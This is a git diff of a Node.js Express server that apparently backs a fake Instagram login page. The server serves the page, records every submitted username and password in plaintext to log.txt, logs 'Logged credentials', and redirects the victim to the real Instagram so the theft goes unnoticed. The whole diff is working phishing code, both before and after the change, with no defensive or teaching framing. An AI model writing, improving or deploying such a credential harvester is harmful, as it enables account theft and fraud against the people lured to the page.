@@ -1,17 +1,33 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const bodyParser = require('body-parser');
+
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public')); // To serve the fake login page
+// Middleware to parse form data
+app.use(bodyParser.urlencoded({ extended: false }));
 
+// Serve static files (like index.html)
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Handle login POST request
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
-  const log = `Username: ${username} | Password: ${password}\n`;
-  fs.appendFileSync('log.txt', log);
-  res.redirect('https://instagram.com'); // Redirect to real Instagram
+
+  const logData = `Username: ${username} | Password: ${password}\n`;
+
+  fs.appendFile('log.txt', logData, (err) => {
+    if (err) {
+      console.error('❌ Failed to write to log.txt', err);
+    } else {
+      console.log('✅ Logged credentials');
+    }
+  });
+
+  // Redirect to real Instagram or show "Login Failed"
+  res.redirect('https://instagram.com');
 });
 
 app.listen(PORT, () => {
